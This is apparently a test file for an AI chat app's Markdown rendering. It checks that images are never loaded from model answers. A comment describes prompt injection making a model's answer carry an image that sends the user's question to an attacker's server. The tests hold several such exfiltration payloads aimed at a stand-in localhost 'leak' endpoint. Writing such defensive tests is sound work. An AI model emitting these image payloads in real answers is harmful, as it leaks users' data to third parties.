import { Component, input } from '@angular/core';
import { TestBed } from '@angular/core/testing';
import { MarkdownComponent } from 'ngx-markdown';
import { appConfig } from './app.config';

// Renders Markdown with the app's REAL providers (same config as the chat),
// so the test checks exactly what a user would see.
@Component({
  imports: [MarkdownComponent],
  template: `<markdown [data]="text()" />`,
})
class Host {
  readonly text = input('');
}

async function render(text: string): Promise<HTMLElement> {
  TestBed.configureTestingModule({ providers: appConfig.providers });
  const fixture = TestBed.createComponent(Host);
  fixture.componentRef.setInput('text', text);
  await fixture.whenStable();
  // ngx-markdown renders asynchronously; give it a moment to finish.
  await new Promise((r) => setTimeout(r, 0));
  await fixture.whenStable();
  return fixture.nativeElement as HTMLElement;
}

// A model answer can carry an injected image (Step 5 Task 6): the browser
// would load it at once and send the question to the attacker's server.
describe('Markdown in answers loads no images', () => {
  it('a Markdown image becomes text, no <img>', async () => {
    const el = await render('Costs 120,000 INR. ![status](http://localhost:9999/leak?q=question)');
    expect(el.querySelector('img')).toBeNull();
    expect(el.textContent).toContain('Costs 120,000 INR.');
  });

  it('a raw HTML <img> becomes visible text, no <img>', async () => {
    const el = await render('Answer. <img src="http://localhost:9999/leak?q=raw">');
    expect(el.querySelector('img')).toBeNull();
  });

  it('upper-case <IMG SRC> too', async () => {
    const el = await render('Answer. <IMG SRC="http://localhost:9999/leak?q=upper">');
    expect(el.querySelector('img')).toBeNull();
  });

  it('a reference-style image', async () => {
    const el = await render('Answer. ![status][ref]\n\n[ref]: http://localhost:9999/leak?q=ref');
    expect(el.querySelector('img')).toBeNull();
  });

  it('an image inside a link', async () => {
    const el = await render('[![x](http://localhost:9999/leak?q=link)](http://example.com)');
    expect(el.querySelector('img')).toBeNull();
  });

  it('a raw <picture>/<source> or <svg><image> is not rendered either', async () => {
    const el = await render(
      '<picture><source srcset="http://localhost:9999/leak?q=pic"></picture> <svg><image href="http://localhost:9999/leak?q=svg"/></svg>',
    );
    expect(el.querySelector('img, picture, source, svg, image')).toBeNull();
  });
});

describe('Markdown in answers still works', () => {
  it('keeps lists, bold, inline code and code blocks', async () => {
    const el = await render('**Bold** and `code`\n\n- one\n- two\n\n```ts\nconst a = 1;\n```');
    expect(el.querySelector('strong')?.textContent).toBe('Bold');
    expect(el.querySelector('p code')?.textContent).toBe('code');
    expect(el.querySelectorAll('li').length).toBe(2);
    expect(el.querySelector('pre code')?.textContent).toContain('const a = 1;');
  });

  it('shows image syntax inside a code block as code, not as an image', async () => {
    const el = await render('```md\n![x](http://localhost:9999/leak)\n```');
    expect(el.querySelector('img')).toBeNull();
    expect(el.querySelector('pre code')?.textContent).toContain('![x](http://localhost:9999/leak)');
  });

  it('shows Angular-style text like <app-child> and [name] as text', async () => {
    const el = await render('Use `<app-child [name]="x">` in the parent.');
    expect(el.querySelector('code')?.textContent).toBe('<app-child [name]="x">');
  });

  it('keeps citations like [page 5] as plain text', async () => {
    const el = await render('A fact [page 5].');
    expect(el.textContent).toContain('[page 5]');
  });
});
